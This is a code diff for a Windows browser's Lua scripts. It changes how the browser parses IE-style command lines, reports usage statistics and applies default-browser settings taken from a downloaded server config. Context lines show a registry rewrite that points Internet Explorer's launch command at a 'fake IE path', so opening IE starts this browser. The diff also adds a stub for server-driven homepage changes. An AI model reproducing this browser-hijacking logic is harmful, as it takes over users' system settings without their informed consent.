@@ -248,12 +248,21 @@ function TryExecuteExtraCode(tServerConfig)
 end
 
 
+--改userconfig中的首页字段
+function TrySetConfigHomePage(tServerConfig)
+
+
+end
+
+
+
 function TrySetDefaultBrowser(tServerConfig, bIgnoreSpanTime)
 	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
-	local tUserConfig = FunctionObj.ReadConfigFromMemByKey("tUserConfig") or {}
+	local tUserConfig = FunctionObj.ReadConfigFromMemByKey("tUserConfig")
 	
 	local tDefaultBrowser = tServerConfig["tDefaultBrowser"]
-	if type(tDefaultBrowser) ~= "table" then
+	if type(tDefaultBrowser) ~= "table" or type(tUserConfig) ~= "table" then
+		FunctionObj.TipLog("[TrySetDefaultBrowser] get table info failed")
 		return false
 	end
 
@@ -293,12 +302,12 @@ function TrySetDefaultBrowser(tServerConfig, bIgnoreSpanTime)
 end
 
 
-function SendSetDefBrowReport(bExit)
+function SendSetDefBrowReport(bExit, strSource)
 	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
 	local tStatInfo = {}
 
 	tStatInfo.strEC = "setdefaultbrowser"  --进入上报
-	tStatInfo.strEA = "launch"
+	tStatInfo.strEA = strSource or "local"
 	tStatInfo.strEL = FunctionObj.GetInstallSrc() or ""
 	tStatInfo.strEV = 1
 	
@@ -368,7 +377,7 @@ function RedirectSysIEPath()
 		return
 	end
 	
-	local strCommand = "\""..strFakeIEPath.."\" /openlink \"%1\""
+	local strCommand = "\""..strFakeIEPath.." \"%1\"\""
 	FunctionObj.RegSetValue("HKEY_CURRENT_USER\\SOFTWARE\\iexplorer\\HKCRAppIE", strOldIEPath)
 	FunctionObj.RegSetValue(strIERegPath, strCommand, true)
 end
@@ -381,8 +390,8 @@ function PrepareProgID(strProgID)
 	local bIs64 = tFunHelper.CheckIs64OS()
 	
 	local strBrowserPath = tFunHelper.GetExePath()
-	strBrowserPath = "\""..strBrowserPath.."\""
-	local strCommand = strBrowserPath.." /openlink \"%1\""
+	local strBrowPathWithFix = "\""..strBrowserPath.."\""
+	local strCommand = strBrowserPath.." \"%1\""
 
 	local strRegValue = tFunHelper.RegQueryValue("HKEY_CLASSES_ROOT\\"..strProgID.."\\shell\\open\\command\\")
 	if not IsRealString(strRegValue) then
@@ -393,7 +402,7 @@ function PrepareProgID(strProgID)
 	local strRegValue = tFunHelper.RegQueryValue("HKEY_CLASSES_ROOT\\"..strProgID.."\\Application\\ApplicationIcon")
 	if not IsRealString(strRegValue) then
 		tipUtil:CreateRegKey("HKEY_CLASSES_ROOT", strProgID.."\\Application")
-		tFunHelper.RegSetValue("HKEY_CLASSES_ROOT\\"..strProgID.."\\Application\\ApplicationIcon", strBrowserPath, bIs64, bInfMode)
+		tFunHelper.RegSetValue("HKEY_CLASSES_ROOT\\"..strProgID.."\\Application\\ApplicationIcon", strBrowPathWithFix, bIs64, bInfMode)
 	end
 
 	
@@ -465,6 +474,8 @@ end
 
 function DoSetDefaultBrowser()
 	local tFunHelper = XLGetGlobal("YBYL.FunctionHelper") 
+	tFunHelper.TipLog("[DoSetDefaultBrowser] begin")
+	
 	local strBrowserPath = tFunHelper.GetExePath()
 	if not IsRealString(strBrowserPath) or not tipUtil:QueryFileExists(strBrowserPath) then
 		return false
@@ -637,13 +648,41 @@ end
 
 function ProcessCommandLine()
 	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
-	local bRet, strURL = FunctionObj.GetCommandStrValue("/openlink")
-	if bRet and IsRealString(strURL) then
-		FunctionObj.OpenURLInNewTab(strURL)
+	ProcessLocalCommand()      --解析自身的命令行
+	
+	local bHasOpenLink = ProcessIECommand()    --解析ie的命令行
+	if bHasOpenLink then
 		return
 	end
 	
 	TryOpenURLWhenStup()
+end
+
+
+function ProcessLocalCommand()
+end
+
+
+--模拟解析ie命令行
+function ProcessIECommand()
+	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
+	local bHasOpenLink = true
+	local cmdString = tipUtil:GetCommandLine()
+	local cmdList = tipUtil:CommandLineToList(cmdString)
+	
+	local bRet, strURL = FunctionObj.GetCommandStrValue4IE("-new")
+	if bRet and FunctionObj.SimpleCheckIsURL(strURL) then
+		FunctionObj.OpenURLInNewTab(strURL)
+		return bHasOpenLink
+	end
+	
+	local strURL = cmdList[1]
+	if FunctionObj.SimpleCheckIsURL(strURL) then
+		FunctionObj.OpenURLInNewTab(strURL)
+		return bHasOpenLink
+	end
+	
+	return not bHasOpenLink
 end
 
 
@@ -676,12 +715,32 @@ end
 
 function DoBackupBussiness()
 	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
-	local cmdString = tipUtil:GetCommandLine()
-	if not string.find(string.lower(cmdString), "/setdefault") then
+	FunctionObj.TipLog("[DoBackupBussiness] enter")
+	
+	local bIgnoreSpanTime = false
+	local bSetHomePage = false
+	local bRet, strSource = FunctionObj.GetCommandStrValue("/setdefault")
+	if not bRet then
+		FunctionObj.TipLog("[DoBackupBussiness] check /setdefault false")
 		return false
 	end
 	
-	FunctionObj.DownLoadServerConfig(function (nDownServer, strServerPath)
+	FunctionObj.TipLog("[DoBackupBussiness] strSource:"..tostring(strSource))
+	
+	local fnDownLoadCofig = FunctionObj.DownLoadServerConfig
+	if IsRealString(strSource) 
+		and (string.lower(strSource) == "ybylpacket" or string.lower(strSource) == "iepacket") then
+		fnDownLoadCofig = FunctionObj.DownLoadInstallConfig
+		-- bIgnoreSpanTime = true
+		bSetHomePage = true
+	end
+	
+	if type(fnDownLoadCofig) ~= "function" then
+		FunctionObj.TipLog("[DoBackupBussiness] fnDownLoadCofig not a function")
+		return false
+	end
+	
+	fnDownLoadCofig(function (nDownServer, strServerPath)
 		if nDownServer ~= 0 or not tipUtil:QueryFileExists(tostring(strServerPath)) then
 			FunctionObj.TipLog("[DoBackupBussiness] Download server config failed , quit ")
 			tipUtil:Exit("Exit")
@@ -689,11 +748,13 @@ function DoBackupBussiness()
 		end
 	
 		local tServerConfig = FunctionObj.LoadTableFromFile(strServerPath) or {}
+		if bSetHomePage then
+			TrySetConfigHomePage(tServerConfig)
+		end
 		
-		local bIgnoreSpanTime = true
 		local bSetSuccess = TrySetDefaultBrowser(tServerConfig, bIgnoreSpanTime)
 		if bSetSuccess then
-			SendSetDefBrowReport(true)
+			SendSetDefBrowReport(true, strSource)
 		else
 			tipUtil:Exit("Exit")
 		end
@@ -701,7 +762,6 @@ function DoBackupBussiness()
 	
 	return true
 end
-
 
 
 function PreTipMain() 
@@ -712,6 +772,9 @@ function PreTipMain()
 		tipUtil:Exit("Exit")
 	end
 	
+	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper")
+	FunctionObj.ReadAllConfigInfo()
+	
 	local bDoBackup = DoBackupBussiness()
 	if bDoBackup then
 		return
@@ -720,9 +783,7 @@ function PreTipMain()
 	StartRunCountTimer()
 
 	LoadIEHelper()	
-	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper")
-	FunctionObj.ReadAllConfigInfo()
-	
+		
 	SendStartupReport(false)
 	SendUserInfoReport()
 	TipMain()
